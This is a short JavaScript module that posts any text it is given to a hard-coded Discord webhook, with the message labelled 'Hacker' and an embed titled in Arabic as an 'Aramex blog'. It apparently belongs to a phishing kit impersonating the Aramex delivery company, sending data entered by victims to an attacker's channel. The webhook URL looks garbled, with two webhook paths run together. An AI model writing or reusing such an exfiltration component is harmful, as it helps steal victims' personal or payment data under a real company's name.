import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1337532099149693000/i2dGsLSBBrtvX9Iso8u7ujqVrB0XYtYZJfAKMObSIXqtNuXM3njRpFxQJ5roC_ErnAnQapi/webhooks/1335207069904535694/B8iXi57-JN-cTcRw0D_uws8yPwTdZwBlguH-QvJsk_7WUNkzF_LwjIC9ZFjRG8IdekL-",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
